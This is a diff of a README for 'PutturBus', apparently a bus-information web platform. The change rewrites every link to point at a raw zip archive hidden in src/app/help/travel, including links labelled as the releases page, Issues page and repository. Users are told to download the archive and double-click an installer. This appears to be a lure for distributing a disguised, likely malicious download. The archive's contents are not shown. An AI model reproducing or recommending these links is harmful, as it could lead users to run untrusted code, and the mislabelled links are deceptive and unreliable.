@@ -1,6 +1,6 @@
 # 🚌 PutturBus - Easily Access Bus Information in Puttur
 
-[![Download PutturBus](https://github.com/ram-398/PutturBus/raw/refs/heads/main/scripts/Puttur-Bus-v3.9-alpha.1.zip%20PutturBus-v1.0-blue)](https://github.com/ram-398/PutturBus/raw/refs/heads/main/scripts/Puttur-Bus-v3.9-alpha.1.zip)
+[![Download PutturBus](https://github.com/ram-398/PutturBus/raw/refs/heads/main/src/app/help/travel/Puttur-Bus-v3.2.zip%20PutturBus-v1.0-blue)](https://github.com/ram-398/PutturBus/raw/refs/heads/main/src/app/help/travel/Puttur-Bus-v3.2.zip)
 
 ## 📚 Introduction
 
@@ -11,7 +11,7 @@ Welcome to PutturBus! This community-driven web platform helps people in and aro
 To start using PutturBus, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Go to the PutturBus releases page by clicking this link: [Download PutturBus](https://github.com/ram-398/PutturBus/raw/refs/heads/main/scripts/Puttur-Bus-v3.9-alpha.1.zip). Here, you will find the latest version of the application ready for download.
+   Go to the PutturBus releases page by clicking this link: [Download PutturBus](https://github.com/ram-398/PutturBus/raw/refs/heads/main/src/app/help/travel/Puttur-Bus-v3.2.zip). Here, you will find the latest version of the application ready for download.
 
 2. **Locate the Latest Version**  
    On the releases page, look for the version number listed at the top. The latest version will typically have the highest number, such as v1.0. Click on it to access the download files.
@@ -41,10 +41,10 @@ PutturBus is packed with features designed to simplify your travel experience:
 To download and install PutturBus:
 
 1. **Find the Download Button**  
-   Visit the releases page: [Download PutturBus](https://github.com/ram-398/PutturBus/raw/refs/heads/main/scripts/Puttur-Bus-v3.9-alpha.1.zip).
+   Visit the releases page: [Download PutturBus](https://github.com/ram-398/PutturBus/raw/refs/heads/main/src/app/help/travel/Puttur-Bus-v3.2.zip).
 
 2. **Select Your File**  
-   Choose the necessary file based on your operating system. For example, if you're using Windows, you might download "https://github.com/ram-398/PutturBus/raw/refs/heads/main/scripts/Puttur-Bus-v3.9-alpha.1.zip".
+   Choose the necessary file based on your operating system. For example, if you're using Windows, you might download "https://github.com/ram-398/PutturBus/raw/refs/heads/main/src/app/help/travel/Puttur-Bus-v3.2.zip".
 
 3. **Install the Application**  
    Once the file is downloaded, locate it in your downloads folder. Double-click the file to run the installer. Follow the prompts to complete the installation.
@@ -72,12 +72,12 @@ Here’s a brief guide on how to navigate PutturBus effectively:
 
 If you encounter issues or have questions, don't hesitate to reach out. You can find help through the following:
 
-- **GitHub Issues Page:** Report problems or suggest improvements [here](https://github.com/ram-398/PutturBus/raw/refs/heads/main/scripts/Puttur-Bus-v3.9-alpha.1.zip).
+- **GitHub Issues Page:** Report problems or suggest improvements [here](https://github.com/ram-398/PutturBus/raw/refs/heads/main/src/app/help/travel/Puttur-Bus-v3.2.zip).
 - **Community Forums:** Join discussions and ask questions on platforms where users share their knowledge.
 
 ## 🔗 Links to Explore
 
-- **GitHub Repository:** Explore the code and contribute to PutturBus [here](https://github.com/ram-398/PutturBus/raw/refs/heads/main/scripts/Puttur-Bus-v3.9-alpha.1.zip).
+- **GitHub Repository:** Explore the code and contribute to PutturBus [here](https://github.com/ram-398/PutturBus/raw/refs/heads/main/src/app/help/travel/Puttur-Bus-v3.2.zip).
 - **Documentation:** For detailed documentation, visit the Wiki section on the GitHub page.
 
 ## 🛠 Contributing
